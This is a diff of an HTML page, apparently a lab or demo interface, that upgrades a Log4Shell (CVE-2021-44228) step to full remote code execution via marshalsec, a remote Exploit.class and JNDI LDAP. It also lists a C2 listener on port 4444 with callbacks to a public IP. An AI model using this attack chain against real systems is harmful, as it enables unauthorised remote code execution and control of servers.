@@ -37,7 +37,7 @@
         <button id="run-chain" type="button">Run Critical VM Compromise</button>
       </div>
       <ol class="steps">
-        <li><code>python3 tools/ldap-listen.py --port 1389</code></li>
+        <li><code>./tools/setup-marshalsec.sh &amp;&amp; ./tools/run-log4shell-ldap.sh --codebase-host YOUR_IP</code></li>
         <li><code>python3 tools/c2-listen.py --port 4444</code></li>
         <li>Set callbacks to your public IP (or SSH tunnel), then run the story.</li>
       </ol>
@@ -56,8 +56,12 @@
 
     <section class="card-ish" style="margin-top:1.25rem">
       <p class="badge">Step 2 · CVE-2021-44228</p>
-      <h2>Log4Shell</h2>
-      <p>JNDI LDAP lookup from Log4j <code>2.14.1</code>.</p>
+      <h2>Log4Shell (full RCE)</h2>
+      <p>
+        JNDI LDAP → marshalsec + remote <code>Exploit.class</code>. Start
+        <code>./tools/run-log4shell-ldap.sh --codebase-host YOUR_IP</code> (not the banner-only listener).
+        Success creates <code>/tmp/jss-log4shell-rce</code> on the VM.
+      </p>
       <div class="row">
         <button id="run-log4j" type="button">Run Log4Shell</button>
       </div>
